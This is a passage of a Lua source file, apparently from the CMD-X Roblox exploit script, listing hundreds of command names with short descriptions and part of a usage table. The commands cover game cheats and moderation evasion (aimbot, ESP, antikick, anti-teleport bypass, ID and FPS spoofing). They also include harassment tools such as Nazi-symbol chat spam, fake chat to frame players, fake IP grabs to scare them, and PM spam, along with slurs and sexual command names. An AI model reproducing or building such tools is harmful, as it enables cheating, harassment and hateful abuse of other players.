				["switchteam"] = "Switches your team to str if it exists.",
				["ping"] = "Shows your ping.",
				["toolfps"] = "Shows your FPS in a tooltip.",
				["untoolfps"] = "()",
				["fuckoff"] = "Closes the GUI.",
				["messagebox"] = "Makes a message box appear containing the string you entered. (SYNAPSE ONLY)",
				["filtering"] = "Checks if a game is filtered or not.",
				["gameid"] = "Lets you know the GameID of the game you are in.",
				["output"] = "Tests output.",
				["enableshiftlock"] = "If the developer of the game your playing on has disabled Shift Lock this will enable it for your character.",
				["maxcamunlock"] = "Unlocks your characters max zooming distance.",
				["position"] = "Sets your characters position to output.",
				["audiolog"] = "Logs what a user is playing.",
				["cambobble"] = "Bobbles camera when you walk.",
				["uncambobble"] = "()",
				["grapple"] = "Grapples to your mouse.",
				["ungrapple"] = "()",
				["remind"] = "Reminds you of str when num is done counting.",
				["step"] = "Allows you to teleport up a building.",
				["unstep"] = "()",
				["antiafk"] = "Prevents you from idling.",
				["nosit"] = "Stops your character from being sat down.",
				["yessit"] = "()",
				["nostun"] = "Stops your character from being PlatformStood.",
				["yesstun"] = "()",
				["badges"] = "Gets all badges if there are any named (Default: BadgeAwarder).",
				["bunnyhop"] = "Bunny hops your character.",
				["unbunnyhop"] = "()",
				["invisible"] = "Makes your character invisible.",
				["sit"] = "Sits your character.",
				["sitwalk"] = "Sits your character but allows your character to move around.",
				["freeze"] = "Freezes your character.",
				["thaw"] = "()",
				["goto"] = "Teleports your character to the player.",
				["walkto"] = "Walks your character to the player.",
				["unwalkto"] = "()",
				["walktopos"] = "Walks your character to the position.",
				["walktopart"] = "Walks your character to the part.",
				["walktoclass"] = "Walks your character to the class.",
				["refresh"] = "Respawns your character on the location of entering this command.",
				["reset"] = "Resets your character.",
				["savepos"] = "Saves your characters position.",
				["loadpos"] = "()",
				["platform"] = "Allows your character to walk on an invisible platform.",
				["unplatform"] = "()",
				["clicktp"] = "Press CTRL to teleport your character to your cursor.",
				["clicktplimit"] = "Limits the distance you can teleport using clicktp.",
				["unclicktplimit"] = "Resets your clicktp limit",
				["infjump"] = "Allows you to infinitely go higher by pressing space.",
				["uninfjump"] = "()",
				["fly"] = "Allows your character to fly.",
				["vehiclefly"] = "Allows your character to fly around in vehicles.",
				["unfly"] = "()",
				["flyspeed"] = "Changes fly speed.",
				["rejoin"] = "Rejoins the game.",
				["game"] = "Joins the GameID you stated in num.",
				["reach"] = "Edits your tools size value.",
				["boxreach"] = "Edits your tools size value in a box formation.",
				["unreach"] = "()",
				["noclip"] = "Allows your character to walk through anything",
				["light"] = "Gives your character a light. (CLIENT SIDED)",
				["unlight"] = "()",
				["esp"] = "Shows where all the players are on your screen.",
				["unesp"] = "()",
				["aimbot"] = "Aims at the closest player to you (Left Ctrl to toggle).",
				["unaimbot"] = "()",
				["spectate"] = "Switches your camera view to the player you stated.",
				["unspectate"] = "()",
				["resetsaves"] = "Removes your current saves.",
				["savesaves"] = "Saves a backup of your current saves.",
				["ageprivate"] = "Says stated users Account Age privately.",
				["agepublic"] = "Says stated users Account Age publicly.",
				["idprivate"] = "Says stated users ID privately.",
				["idpublic"] = "Says stated users ID publicly.",
				["vrprivate"] = "Says stated users Virtual Reality System privately.",
				["vrpublic"] = "Says stated users Virtual Reality System publicly.",
				["nazispam"] = "Spams nazi signs in the chat.",
				["unnazispam"] = "()",
				["spam"] = "Spams the text you entered.",
				["unspam"] = "()",
				["pmspam"] = "Spams the text you entered in someones PM.",
				["unpmspam"] = "()",
				["spamspeed"] = "Changes the speed of the spam.",
				["dicepublic"] = "Rolls a dice publicly.",
				["diceprivate"] = "Rolls a dice privately.",
				["numberpublic"] = "Calls a random number you stated between 2 numbers publicly.",
				["numberprivate"] = "Calls a random number you stated between 2 numbers privately.",
				["loadcustoms"] = "Lists custom scripts.",
				["plugin"] = "Loads plugin that you stated.",
				["find"] = "Locates where your stated user is using the ESP command.",
				["unfind"] = "()",
				["clickdelete"] = "Deletes any part you click on.",
				["unclickdelete"] = "()",
				["logs"] = "Logs all chats including whispers in a GUI.",
				["time"] = "Lists the current time of this timezone.",
				["removeforces"] = "Removes forces from your character.",
				["audiologger"] = "Logs all audios it finds from players in a loop.",
				["audiologgersave"] = "Saves all logged audios from audiologger.",
				["antilag"] = "Attempts to minimize lag as much as possible best works with Graphics set to 1.",
				["clear"] = "Deletes all hats and gears dropped into the workspace.",
				["removeterrain"] = "Removes all terrain.",
				["outputlarger"] = "Makes an output-larger.",
				["compliment"] = "Compliments player",
				["roast"] = "Roasts player",
				["singinfo"] = "Lists how to make your own song compatible with sing command.",
				["sing"] = "Makes your character sing a song (Presets: genocide/animethighs/evilfantasy/$harkattack/introversion/lucy/tyler/methhead/superfuntime/haha/diamonds)",
				["deletepos"] = "Deletes specified waypoint.",
				["clearpos"] = "Clears all waypoints.",
				["gotopos"] = "Modifies how and where you tp to the character.",
				["autokey"] = "Auto key presses the key you enter (SYNAPSE ONLY).",
				["unautokey"] = "()",
				["swimwalk"] = "Allows you to swim on land.",
				["instances"] = "Shows you how many instances are in the game.",
				["loadcustomsclr"] = "Clears all loadcustoms.",
				["iq"] = "Shows players IQ (RANDOM).",
				["players"] = "Lists players in your game.",
				["freereach"] = "Allows you to control reach freely.",
				["jobid"] = "Shows the JobID of your current game useful for rejoining later on.",
				["massage"] = "Shows all players ages.",
				["gearhat"] = "Makes your gears into hats.",
				["bypass"] = "Enables in-chat bypass",
				["unbypass"] = "Disables in-chat bypass",
				["emote"] = "Plays the emote you enter by name (R15 ONLY).",
				["spotify"] = "Loads spotify presence.",
				["chatframe"] = "Forces player to chat something so you can frame them (CLIENT SIDED).",
				["forcebubblechat"] = "Forces bubble chat to appear for players chatting (CLIENT SIDED).",
				["unforcebubblechat"] = "()",
				["itemesp"] = "Creates ESP's for in-game items as best as possible.",
				["unitemesp"] = "()",
				["setdiscord"] = "Put your discord name in here for use of the command saydiscord.",
				["saydiscord"] = "Says your discord name in chat.",
				["removecustombodyparts"] = "Removes custom body parts set by games.",
				["insane"] = "Makes your character spas out. (R6 ONLY)",
				["hotkeyaimbot"] = "Changes your hotkey for activating aimbot.",
				["hotkeyesp"] = "Changes your hotkey for activating ESP.",
				["admindetect"] = "Detects admins in the game (If the game has HDAdmin do ;admins before running the command)(SUPPORTS: HD/KOHLS)",
				["streamermode"] = "Hides all names in games (Suitable for streamers or people showcasing CMD-X <3).",
				["permflyspeed"] = "Fly speed is set to this every time you fly.",
				["loopgoto"] = "Loop teleports to the player.",
				["unloopgoto"] = "()",
				["dupegears"] = "Dupes tools until it reaches the set amount.",
				["permwalkspeed"] = "Walk speed is set to this every time you use walkspeed.",
				["permjumppower"] = "Jump power is set to this every time you use jumppower.",
				["permhipheight"] = "Hip height is set to this every time you use hipheight.",
				["permgravity"] = "Gravity is set to this every time you use gravity.",
				["gotobp"] = "Teleports to a player while bypassing any anti-teleport.",
				["mute"] = "Mutes players sounds in a loop including radios.",
				["unmute"] = "()",
				["vgoto"] = "Teleports to a player while in a vehicle.",
				["hotkeynew"] = "Adds a new hotkey to the list of hotkeys that are activated when you press the keybind.",
				["hotkeys"] = "Allows you to add hotkeys.",
				["hotkeydel"] = "Deletes a hotkey in the hotkeys list.",
				["hotkeysclr"] = "Clears the hotkeys.",
				["changestyle"] = "Changes the style of your CMD-X refer to csinfo for more info on this command.",
				["csinfo"] = "Lists info about changestyle/cs.",
				["chat"] = "Forces you to chat whatever you put in str (Bypasses any mute).",
				["curvetools"] = "Curves your tools.",
				["spiraltools"] = "Spirals your tools.",
				["toggleconfly"] = "Toggles if your fly starts again after a reset.",
				["lagchat"] = "Lags chat using _'s.",
				["trollchat"] = "Picks a random trolly/ annoying chat.",
				["unbodypositionwalkspeed"] = "()",
				["removegears"] = "Removes all your tools.",
				["unclicktp"] = "()",
				["unswimwalk"] = "()",
				["unlagchat"] = "()",
				["playerstalker"] = "Loads PlayerStalker GUI.",
				["clip"] = "()noclip",
				["orbit"] = "Orbits a player.",
				["closeorbit"] = "Close orbits a player.",
				["unorbit"] = "()",
				["suggestions"] = "Turns CMD suggestions on or off.",
				["clientbring"] = "Brings user to you (CLIENT SIDED).",
				["unclientbring"] = "()",
				["bring"] = "Brings the player to you (NEED A HAT AND TOOL).",
				["kill"] = "Kills the player (NEED A HAT AND TOOL).",
				["give"] = "Gives the player your tool.",
				["using"] = "Specifies that you are using CMD-X. <3",
				["playercases"] = "Lists player cases you can use in your second argument.",
				["coronavirus"] = "Provides information about coronavirus using an API.",
				["joindateprivate"] = "Shows players join date privately.",
				["autoobby"] = "Allows you to complete an obby without pressing spacebar.",
				["unautoobby"] = "()",
				["joindatepublic"] = "Shows players join date publicly.",
				["ppsize"] = "Shows players PP size. (RANDOM)",
				["gaysize"] = "Shows how gay a player is. (RANDOM)",
				["matchmake"] = "Shows how much of a match 2 players are. (RANDOM)",
				["height"] = "Shows how tall a player is. (RANDOM)",
				["grabtools"] = "Grabs tools that enter workspace.",
				["ungrabtools"] = "()",
				["earrape"] = "Plays all sounds in workspace.",
				["respectfiltering"] = "Checks if respect filtering is enabled or disabled.",
				["removefog"] = "Removes fog.",
				["clientfreeze"] = "Freezes player on client.",
				["unclientfreeze"] = "()",
				["refreshdead"] = "Refreshes your character when death occurs.",
				["unrefreshdead"] = "()",
				["avatar"] = "Shows UserId's avatar.",
				["statistics"] = "Shows your most used commands.",
				["grabip"] = "Grabs a fake IP designed to scare the player (RANDOM).",
				["enablereset"] = "Force enables the reset button incase a game has disabled it.",
				["disablereset"] = "Disables the reset button.",
				["massjoindate"] = "Shows all players joindates.",
				["loop"] = "Loops command with arguments.",
				["unloop"] = "()",
				["savetools"] = "Saves tools.",
				["loadtools"] = "Loads tools.",
				["hotkeyfly"] = "Saves a toggle for fly.",
				["hotkeyxray"] = "Saves a toggle for x-ray",
				["animsync"] = "Syncs anim with player if caller is /e or .e",
				["unanimsync"] = "()",
				["clicktphotkey"] = "Changes the hotkey for clicktp.",
				["permspamspeed"] = "Changes the perm spam speed.",
				["massid"] = "Shows all players IDs.",
				["fps"] = "Shows your FPS.",
				["whisperlogs"] = "Logs any whispers specifically.",
				["playerlogs"] = "Logs messages by player specifically.",
				["rejoindiff"] = "Rejoins but takes you to a differnt server (Server Hopper).",
				["antikick"] = "Stops you from being kicked.",
				["servers"] = "Lists servers.",
				["streamsnipe"] = "Streamsnipes a user.",
				["listentercmds"] = "Lists enter cmds.",
				["listhotkeys"] = "Lists hotkeys.",
				["gametime"] = "Shows your current elapsed time in game.",
				["hotkeynoclip"] = "Adds a hotkey for noclip.",
				["enabledrops"] = "Enables tools dropping features.",
				["disabledrops"] = "Disables tools dropping features.",
				["novoid"] = "Stops you from being voided.",
				["yesvoid"] = "()",
				["truesight"] = "Shows invisible objects.",
				["untruesight"] = "()",
				["disableplayer"] = "Removes a player from your client.",
				["enableplayer"] = "Brings back a player on your client.",
				["gotopart"] = "Teleports your character to the part.",
				["clientbringpart"] = "Brings part to you.",
				["clientdeletepart"] = "Deletes part.",
				["copyoutput"] = "Copies output.",
				["copypath"] = "Copies parts path.",
				["outputbind"] = "Changes output bind.",
				["boobsize"] = "Tells you the size of players boobs.",
				["clearoutput"] = "Cleared output.",
				["gotospawn"] = "Teleports you to a spawn point.",
				["clearwaves"] = "Clears waves on your client.",
				["calmwaves"] = "Calms waves on your client.",
				["fov"] = "Changes FOV.",
				["mousesensitivity"] = "Changes mouse sensitivity.",
				["volume"] = "Changes Master Volume.",
				["graphics"] = "Changes Master Graphics.",
				["freecam"] = "Activates freecam.",
				["unfreecam"] = "()",
				["reload"] = "Reloads CMD-X.",
				["backpack"] = "Lists tools in players backpack.",
				["partesp"] = "Shows all items that have the name or the class of what you enter.",
				["unpartesp"] = "()",
				["animspeed"] = "Speeds up animations (works best with .loop).",
				["noprompt"] = "Stops games from pushing purchase prompts.",
				["yesprompt"] = "()",
				["rappu"] = "Shows players RAP publicly.",
				["rappr"] = "Shows players RAP privately.",
				["removeunanchored"] = "Destroys unanchored parts (works best with .loop).",
				["retard"] = ".juicewrld but better",
				["unretard"] = "()",
				["nocommands"] = "Disables all commands.",
				["yescommands"] = "()",
				["backpackplay"] = "Backpack plays your sound.",
				["unbackpackplay"] = "()",
				["weed"] = "420.",
				["noguis"] = "Disables player GUIs.",
				["yesguis"] = "()",
				["guitruesight"] = "Shows you hidden GUIs.",
				["unguitruesight"] = "()",
				["freecamspeed"] = "Changes speed of freecam.",
				["permfreecamspeed"] = "Changes perm speed of freecam.",
				["nobillboardguis"] = "Deletes all billboard guis.",
				["yesbillboardguis"] = "()",
				["grippos"] = "Changes tools grip.",
				["shiftwalkspeed"] = "If pressing shift your walkspeed will change.",
				["unshiftwalkspeed"] = "()",
				["animationsteal"] = "Copies a players animations.",
				["unanimationsteal"] = "()",
				["nohurtoverlay"] = "Turns off hurt overlay/animation.",
				["yeshurtoverlay"] = "()",
				["gotofreecam"] = "Teleports your character to freecams current position.",
				["restorelocalscripts"] = "Restores local scripts.",
				["newaudios"] = "Lists newest audio IDs uploaded to roblox.",
				["removecustomnametag"] = "Removes custom nametag if the game gives it to you.",
				["stubby"] = "Makes you stubby.",
				["timedcmd"] = "Runs a command after the given amount of time.",
				["depth"] = "Changes your depth of field.",
				["undepth"] = "()",
				["cinematic"] = "Enables cinematic mode.",
				["uncinematic"] = "()",
				["atmosphere"] = "Changes atmosphere of your game.",
				["unatmosphere"] = "()",
				["removefx"] = "Removes all FX.",
				["chaos"] = "Executes a random command every 5 seconds.",
				["unchaos"] = "()",
				["funfact"] = "Grabs a funfact from an API.",
				["antifling"] = "Nocollides other players to avoid being flung in any way.",
				["cmdinfo"] = "Lists command info seperately.",
				["simulationradius"] = "Changes simulation radius (MAY BREAK SCHAT AND SUSERS).",
				["grabunanchored"] = "Updates unanchored parts.",
				["clearunanchored"] = "()",
				["spinunanchored"] = "Spins unanchored parts around your character.",
				["unspinunanchored"] = "()",
				["randomcmd"] = "Executes a random command.",
				["replayintro"] = "Replays intro.",
				["masscmd"] = "Executes multiple commands at once.",
				["mass"] = "Loops player arguments on command.",
				["touchinterests"] = "Fires touch interests.",
				["singletouchinterest"] = "Fires touch interest.",
				["clickdetectors"] = "Fires click detectors.",
				["singleclickdetector"] = "Fires click detector.",
				["gotoclass"] = "Teleports player to a part in that class.",
				["playingaudios"] = "Tells you the currently playing audios.",
				["testaudio"] = "Tests audio out for you.",
				["stopdupegears"] = "()",
				["stopsing"] = "()",
				["tracers"] = "Traces players using Drawing API.",
				["untracers"] = "()",
				["directjoin"] = "Directly joins the GUID in question.",
				["irltime"] = "Sets the game time to your irl time.",
				["tabs"] = "Turns tabs on or off.",
				["changetab"] = "Changes a tab from 1-9.",
				["debugging"] = "Allows error showing on commands.",
				["runafter"] = "Makes CMD-X automatically re-execute on rejoin.",
				["removeinchar"] = "Removes whatever you state from character.",
				["unsitwalk"] = "()",
				["setbackunanchored"] = "Sets back all unanchored parts to original positions.",
				["cutmuteloop"] = "Cuts your mute loops.",
				["supermute"] = "Mutes everyone and the game.",
				["unsupermute"] = "()",
				["robloxqtversion"] = "Shows Roblox Studios current version.",
				["teleportstring"] = "Sends a formatted version of your current teleport info.",
				["copyoutputlarger"] = "Copies current output larger.",
				["friend"] = "Sends friend request to player in your lobby.",
				["autorejoin"] = "Turns auto rejoin on or off.",
				["onjoin"] = "Runs a command on player join.",
				["unonjoin"] = "()",
				["onleave"] = "Runs a command on player leave.",
				["unonleave"] = "()",
				["freegotobp"] = "Freely bypass teleports to the set position.",
				["gotobppart"] = "Bypass telports to part.",
				["gotobpspawn"] = "Bypass telports to spawn.",
				["freegoto"] = "Freely teleports to the set position.",
				["billboardmaxdistance"] = "Sets all billboards distance to the max.",
				["unbillboardmaxdistance"] = "()",
				["billboardtruesight"] = "Turns on billboard truesight.",
				["unbillboardtruesight"] = "()",
				["surfaceguitruesight"] = "Turns on surface gui truesight.",
				["unsurfaceguitruesight"] = "()",
				["clickdetectormaxdistance"] = "Sets clickdetector distance to the max.",
				["unclickdetectormaxdistance"] = "()",
				["gotobpclass"] = "Bypass teleports to class.",
				--["hatgiverspam"] = "Spams hat givers and drops hats if there are any.",
				["fakelag"] = "Simulates fake network lag.",
				["unfakelag"] = "()",
				["hitboxes"] = "Shows you all hitboxes.",
				["unhitboxes"] = "()",
				["animdata"] = "Shows you information about your current animations.",
				["unanimdata"] = "()",
				["anticheat"] = "Sets anticheat variables on or off.",
				["anticheats"] = "Lists anticheat variables.",
				["unfriend"] = "()",
				["cutbackpackplayloop"] = "Cuts backpackplay loops that are running.",
				["freecamgoto"] = "Teleports freecam to a player.",
				["vnoclip"] = "Turns on vehicle noclip.",
				["vclip"] = "()",
				["freecamfreegoto"] = "Teleports freecam to pos.",
				["freecamgotopart"] = "Teleports freecam to part.",
				["audiotp"] = "Teleports audio pos to num.",
				["memory"] = "Shows you your current memory usage.",
				["uncleanfling"] = "()",
				["loadbpppos"] = "Bypass teleports to waypoint.",
				["notoolanim"] = "Removes tool animations.",
				["play"] = "Plays audios in all boomboxes.",
				["attachmenttruesight"] = "Shows all attachments.",
				["unattachmenttruesight"] = "()",
				["autoplatform"] = "Automatically creates a platform when you walk off a part.",
				["unautoplatform"] = "()",
				["quickexit"] = "Quickly leaves the game.",
				["vfreegoto"] = "Teleports vehicle freely.",
				["vgotopart"] = "Teleports vehicle to part.",
				["vgotoclass"] = "Teleports vehicle to class.",
				["vloadpos"] = "Teleports vehicle to waypoint.",
				["robloxversion"] = "Shows you the version of Roblox you are on.",
				["freecamloadpos"] = "Teleports freecam to waypoint.",
				["rejoinrefresh"] = "Rejoins and places you back at the spot you were at.",
				["backpackplay"] = "Loop plays plrs audio to stop muting.",
				["unbackpackplay"] = "()",
				["migratesaves"] = "Migrates save files/backups to CMD-X.lua.",
				["resetguipos"] = "Resets GUI position.",
				["loopfling"] = "Loop flings player.",
				["unloopfling"] = "()",
				["nomouse"] = "Disables mouse icon.",
				["yesmouse"] = "()",
				["futurelighting"] = "Changes lighting to future.",
				["unfuturelighting"] = "()",
				["removelefthand"] = "Removes left hand.",
				["removerighthand"] = "Removes right hand.",
				["removeleftfoot"] = "Removes left foot.",
				["removerightfoot"] = "Removes right floor.",
				["removerightlowerarm"] = "Removes right lower arm.",
				["removeleftlowerarm"] = "Removes left lower arm.",
				["removerightlowerleg"] = "Removes right lower leg.",
				["removeleftlowerleg"] = "Removes left lower leg.",
				["nonick"] = "Blocks nicknames and shows real names.",
				["yesnick"] = "()",
				["appearanceidpublic"] = "Publicly shows the character appearance id of player.",
				["appearanceidprivate"] = "Privately shows the character appearance id of player.",
				["nilgoto"] = "Teleports to player while in nil.",
				["nilfreegoto"] = "Freely teleports to position while in nil.",
				["nilgotopart"] = "Teleports to part while in nil.",
				["nilgotoclass"] = "Teleports to class while in nil.",
				["removeinworkspace"] = "Removes part in workspace.",
				["listnil"] = "Lists nil instances.",
				["removeinnil"] = "Removes part in nil instances.",
				["noclaim"] = "Stops you from being network claimed.",
				["yesclaim"] = "()",
				["destroyheight"] = "Sets fallen parts destroy height.",
				["nameesp"] = "Runs ESP with only names.",
				["unnameesp"] = "()",
				["spectatepart"] = "Views part.",
				["rejoinexecute"] = "Rejoins and re-executes CMD-X once.",
				["multispam"] = "Spams strings seperated by commas.",
				["logspam"] = "Spams any chat loggers without showing in chat.",
				["unlogspam"] = "()",
				["logchat"] = "Sends message to any chat loggers without showing in chat.",
				["removeroot"] = "Removes characters HumanoidRootPart.",
				["rejoinrefreshexecute"] = "Rejoins and places your character in the original spot and executes.",
				["nofall"] = "Prevents you from ragdolling.",
				["yesfall"] = "()",
				["nofallbp"] = "Prevents you from ragdolling.",
				["yesfallbp"] = "()",
				["fixbubblechat"] = "Fixes the bubblechat being cut off.",
				["unfixbubblechat"] = "()",
				["darkbubbles"] = "Makes bubblechat dark themed.",
				["undarkbubbles"] = "()",
				["combo"] = "Runs a chain of commands together.",
				["combos"] = "Lists combos.",
				["combonew"] = "Creates a new combo.",
				["combodel"] = "Removes a combo.",
				["combosclr"] = "Clears all combos.",
				["hd"] = "HD Admin hook.",
				["colourbubbles"] = "Gives you coloured chat bubbles to your custom.",
				["uncolourbubbles"] = "()",
				["kohls"] = "Kohls Admin hook.",
				["creatoridpublic"] = "Publicly shows the creatorid of the game.",
				["creatoridprivate"] = "Privately showws the creatorid of the game.",
				["creatorid"] = "Sets your ID's to the creators.",
				["transparentbubbles"] = "Gives you transparent chat bubbles.",
				["untransparentbubbles"] = "()",
				["disableshiftlock"] = "()",
				["robloxfromdiscordid"] = "Gets roblox account from discord id.",
				["nilchatcmds"] = "Makes CMD-X chat commands not appear on chat.",
				["unnilchatcmds"] = "()",
				["thirdperson"] = "Sets your camera to third person.",
				["firstperson"] = "Sets your camera to first person.",
				["xraycamera"] = "Allows your camera to look through walls.",
				["unxraycamera"] = "()",
				["retardchat"] = "Retards your chat on message posting.",
				["unretardchat"] = "()",
				["scriptusers"] = "Shows people currently using CMD-X.",
				["noshow"] = "Allows you to appear off .scriptusers.",
				["reverse"] = "Allows you to reverse your HumanoidRootParts CFrame.",
				["maxslopeangle"] = "Changes your MaxSlopeAngle.",
				["permmaxslopeangle"] = "Permanently changes your MaxSlopeAngle.",
				["defaultmaxslopeangle"] = "Sets your MaxSlopeAngle to default.",
				["notouch"] = "Stops touch interests from being fired.",
				["yestouch"] = "()",
				["badgesnipe"] = "Snipes a users game by badges earnt.",
				["viewserver"] = "Allows you to see players in another server.",
				["chatprivacypublic"] = "Says a users chat privacy mode publicly.",
				["chatprivacyprivate"] = "Says a users chat privacy mode privately.",
				["chatprivacy"] = "Sets your chat privacy.",
				["masschatprivacy"] = "Says everyones chat privacy.",
				["hotkeyplatformflytoggle"] = "Hotkey for pfly toggle.",
				["hotkeyplatformflyhold"] = "Hotkey for pfly hold.",
				["hotkeysitflytoggle"] = "Hotkey for sfly toggle.",
				["hotkeysitflyhold"] = "Hotkey for sfly hold.",
				["unplatformfly"] = "()",
				["platformfly"] = "Allows you to fly with a platform.",
				["unsitfly"] = "()",
				["sitfly"] = "Allows you to fly while sitting.",
				["hotkeyflyhold"] = "Fly, but only when held.",
				["cameraoffset"] = "Changes the offset of your camera.",
				["norotate"] = "Stops rotation of the body.",
				["yesrotate"] = "()",
				["outofbody"] = "Allows you to walk around like a normal character, out of body.",
				["drawingnew"] = "Uses a lua drawing library instead of your exploits.",
				["drawingold"] = "Uses your exploits drawing api if it has one.",
				["nomessages"] = "Stops messages from being sent (HD,Instances).",
				["yesmessages"] = "()",
				["removecmd"] = "Removes command from your CMD-X temporarily.",
				["spoofgrouprole"] = "Spoofs group role (only works on client scripts).",
				["unspoofgrouprole"] = "()",
				["nogameteleport"] = "Stops you from teleporting to other games (only works on client scripts).",
				["yesgameteleport"] = "()",
				["parttracers"] = "Enables tracers on parts.",
				["unparttracers"] = "()",
				["lookat"] = "Makes your character stare at player.",
				["unlookat"] = "()",
				["spoofclientid"] = "Spoofs your clientid to whatever you want.",
				["randomspoofclientid"] = "Spoofs your clientid to a random set.",
				["unspoofclientid"] = "()",
				["cleanhats"] = "Cleans up all hats in workspace.",
				["smartchat"] = "Punctuates your chat messages.",
				["unsmartchat"] = "()",
				["xboxtagpublic"] = "Shows you the users xbox gamertag if they are using xbox publicly.",
				["xboxtagprivate"] = "Shows you the users xbox gamertag if they are using xbox privately.",
				["massxboxtag"] = "Shows everyones xbox gamertag if they are using xbox.",
				["followedintopublic"] = "Shows if user followed someone into game publicly.",
				["followedintoprivate"] = "Shows if user followed someone into game privately.",
				["massfollowedinto"] = "Shows everyones user that followed someone into game.",
				["notifyfollowed"] = "Notifies you if someone follows you into game through your profile.",
				["unnotifyfollowed"] = "()",
				["replicateanim"] = "Replicates animation id and plays it. (CREDIT: RIPTXDE)",
				["replicateanimspeed"] = "Changes speed of replicated animation.",
				["spooffps"] = "Spoofs your fps to whatever you want.",
				["spoofping"] = "Spoofs your ping to whatever you want.",
				["spoofmemory"] = "Spoofs your memory to whatever you want.",
				["antiwindowafk"] = "Stops the game from AFKing you when you unfocus your window.",
				["unantiwindowafk"] = "()",
				["clearcharacter"] = "Clears your character appearance.",
				["discord"] = "Sets your clipboard to a CMD-X discord invite.",
				["alias"] = "Creates a custom alias for a command (can not replace commands)",
				["delalias"] = "Removes a custom alias",
				["aliases"] = "Lists custom aliases",
			}
			CMDS.usage = {
				["promptnew"] = "(str/name)",
				["prefixnew"] = "(str)",
				["hotkeyopen"] = "(str)",
				["hotkeyfocus"] = "(str)",
				["entercmdnew"] = "(str)",
				["entercmddel"] = "(str)",
				["eightballpu"] = "(str)",
				["eightballpr"] = "(str)",
				["friendjoin"] = "(friend name)",
				["support"] = "(CB / COPY)",
				["walkspeed"] = "(num)",
				["jumppower"] = "(num)",
				["hipheight"] = "(num)",
				["gravity"] = "(num)",
				["bodypositionwalkspeed"] = "(num)",
				["banlands"] = "(plr)",
				["glue"] = "(plr)",
				["fling"] = "(plr)",
				["annoy"] = "(plr)",
				["plague"] = "(name)",
				["parts"] = "(name)",
				["animation"] = "(num1) (num2)",
				["animpack"] = "(animation)",
				["spin"] = "(num)",
				["facefuck"] = "(plr)",
				["facefuckanim"] = "(plr)",
				["piggyback"] = "(plr)",
				["fuck"] = "(plr)",
				["follow"] = "(plr)",
				["math"] = "(num) (+ / - / / / *) (num)",
				["switchteam"] = "(str)",
				["messagebox"] = "(str)",
				["output"] = "(str)",
				["position"] = "(CB / COPY)",
				["audiolog"] = "(plr) (CB / COPY)",
				["remind"] = "(num) (h / m / s) (str)",
				["goto"] = "(plr)",
				["walkto"] = "(plr)",
				["walktopos"] = "(x | y | z)",
				["walktopart"] = "(part)",
				["walktoclass"] = "(class)",
				["savepos"] = "(str)",
				["loadpos"] = "(str)",
				["flyspeed"] = "(num)",
				["game"] = "(num)",
				["reach"] = "(num)",
				["boxreach"] = "(num)",
				["light"] = "(num)",
				["aimbot"] = "(Team / FFA)",
				["whitelist"] = "(plr)",
				["unwhitelist"] = "(plr)",
				["spectate"] = "(plr)",
				["ageprivate"] = "(plr)",
				["agepublic"] = "(plr)",
				["idprivate"] = "(plr)",
				["idpublic"] = "(plr)",
				["vrprivate"] = "(plr)",
				["vrpublic"] = "(plr)",
				["profileinfo"] = "(plr)",
				["spam"] = "(str)",
				["pmspam"] = "(plr) (str)",
				["spamspeed"] = "(num)",
				["numberpublic"] = "(num1) (num2)",
				["numberprivate"] = "(num1) (num2)",
				["plugin"] = "(name)",
				["find"] = "(plr)",
				["unfind"] = "(plr)",
				["time"] = "(timezone)",
				["outputlarger"] = "(str)",
				["compliment"] = "(plr)",
				["roast"] = "(plr)",
				["sing"] = "(link / preset)",
				["deletepos"] = "(str)",
				["gotopos"] = "(behind / infront / left / right / above / under)",
				["autokey"] = "(key)",
				["iq"] = "(plr)",
				["freereach"] = "(num) (num) (num)",
				["emote"] = "(id)",
				["chatframe"] = "(plr/str)",
				["setdiscord"] = "(str)",
				["saydiscord"] = "(cb/copy)",
				["hotkeyaimbot"] = "(key)",
				["hotkeyesp"] = "(key)",
				["permflyspeed"] = "(num)",
				["loopgoto"] = "(plr)",
				["dupegears"] = "(num)",
				["permwalkspeed"] = "(num)",
				["permjumppower"] = "(num)",
				["permhipheight"] = "(num)",
				["permgravity"] = "(num)",
				["gotobp"] = "(plr)",
				["unmute"] = "(plr/all/others)",
				["vgoto"] = "(plr)",
				["hotkeynew"] = "(key) (cmd)",
				["hotkeydel"] = "(cmd)",
				["changestyle"] = "(style)",
				["chat"] = "(str)",
				["toggleconfly"] = "(on / off)",
				["orbit"] = "(plr)",
				["closeorbit"] = "(plr)",
				["suggestions"] = "(on / off)",
				["clientbring"] = "(plr)",
				["bring"] = "(plr)",
				["kill"] = "(plr)",
				["give"] = "(plr)",
				["coronavirus"] = "(country (OPTIONAL))",
				["joindateprivate"] = "(plr)",
				["joindatepublic"] = "(plr)",
				["ppsize"] = "(plr)",
				["gaysize"] = "(plr)",
				["matchmake"] = "(plr) (plr2)",
				["height"] = "(plr)",
				["clientfreeze"] = "(plr)",
				["unclientfreeze"] = "(plr)",
				["avatar"] = "(name)",
				["grabip"] = "(plr)",
				["loop"] = "(str)",
				["hotkeyfly"] = "(key)",
				["hotkeyxray"] = "(key)",
				["animsync"] = "(plr)",
				["clicktphotkey"] = "(key)",
				["permspamspeed"] = "(num)",
				["playerlogs"] = "(plr)",
				["rejoindiff"] = "(any, fast, smallest, largest)",
				["streamsnipe"] = "(name) (gameid / this)",
				["hotkeynoclip"] = "(key)",
				["disableplayer"] = "(plr)",
				["enableplayer"] = "(plr)",
				["gotopart"] = "(part)",
				["clientbringpart"] = "(part)",
				["clientdeletepart"] = "(part)",
				["copyoutput"] = "(start / break)",
				["copypath"] = "(part)",
				["outputbind"] = "(chat / default)",
				["boobsize"] = "(plr)",
				["fov"] = "(num)",
				["mousesensitivity"] = "(1 - 10)",
				["volume"] = "(0 - 1)",
				["graphics"] = "(1 - 10)",
				["backpack"] = "(plr)",
				["partesp"] = "(name / class) (item)",
				["animspeed"] = "(num)",
				["rappu"] = "(plr)",
				["rappr"] = "(plr)",
				["freecamspeed"] = "(num)",
				["permfreecamspeed"] = "(num)",
				["grippos"] = "(num) (num) (num)",
				["shiftwalkspeed"] = "(num)",
				["newaudios"] = "(amount)",
				["timedcmd"] = "(secs) (command) (works with .loop)",
				["depth"] = "(num)",
				["atmosphere"] = "(num)",
				["cmdinfo"] = "(cmd)",
				["grabunanchored"] = "(model)",
				["spinunanchored"] = "(offset)",
				["masscmd"] = "(cmd) (cmd) ...",
				["mass"] = "(cmd)",
				["touchinterests"] = "(model)",
				["singletouchinterest"] = "(name)",
				["clickdetectors"] = "(model)",
				["singleclickdetector"] = "(name)",
				["gotoclass"] = "(class)",
